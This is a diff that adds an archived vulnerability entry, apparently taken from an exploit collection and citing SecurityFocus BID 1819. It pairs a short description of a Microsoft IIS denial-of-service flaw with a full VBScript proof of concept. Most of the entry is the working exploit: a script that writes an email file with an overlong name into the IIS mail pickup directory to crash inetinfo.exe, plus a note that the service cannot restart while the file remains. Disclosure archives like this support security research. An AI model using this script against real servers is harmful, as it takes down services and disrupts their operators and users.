@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/1819/info
+
+An email with a filename consisting of over 86 characters and an extension of .txt.eml will cause Microsoft IIS to crash if placed in the \mailroot\pickup directory. The process inetinfo.exe will crash, resulting in a Dr. Watson access violation error. Restarting IIS is required in order to regain normal functionality.
+
+' PLEASE PROVIDE YOUR PICKUP PATH HERE
+Rootpath = "c:\inetpub\mailroot\pickup\"
+
+Set fso = createobject("scripting.filesystemobject")
+Thename = Createkey & fso.GetTempName & ".eml"
+Set Thefile = fso.GetFolder(rootpath).CreateTextFile(TheName)
+Thefile.writeline "X-Sender: CRASHTHIS@my.net"
+Thefile.writeline "X-Receiver: dump@my.net"
+Thefile.writeline "From: <CRASHTHIS@my.net>"
+Thefile.writeline "To: <dump@my.net>"
+Thefile.writeline "Subject: MINE DID NOT CRASH"
+Thefile.writeline "Date: " & now()
+Thefile.writeline "X-Generator: " & Thename
+Thefile.close
+Set thefile = nothing
+Thename = ""
+
+Function Createkey
+for z = 1 to 80
+randomize
+a = Int((25 * Rnd) + 1)
+password = password & chr(a+65)
+next
+Createkey = password
+end function
+' Warning IF InetInfo.exe crashes it cannot be started again as long as the
+file is still there!
+
+</example script>
